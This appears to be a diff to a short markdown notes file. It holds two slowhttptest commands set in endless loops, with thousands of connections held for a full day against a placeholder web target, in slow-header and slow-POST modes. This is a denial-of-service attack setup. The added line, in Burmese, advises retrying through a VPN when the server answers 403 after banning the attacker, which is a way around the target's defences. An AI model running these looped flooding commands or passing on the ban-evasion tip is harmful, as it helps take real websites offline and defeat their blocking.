@@ -7,3 +7,8 @@
 ``` while true; do slowhttptest -H -c 10239 -r 15321 -l 86400 -u http://?.com -s 512 -t GET -v 3; done ```
 
 ``` while true; do slowhttptest -B -c 10239 -r 15321 -l 86400 -u http://?.com -s 4096 -t POST -f application/x-www-form-urlencoded -x 4 -v 2; done; ```
+
+
+# Other notes
+
+``` 403 အမြဲပြနေတာက Server က Ban လို့ -> VPNနဲ့ ပြန်စမ်းကြည့် ```
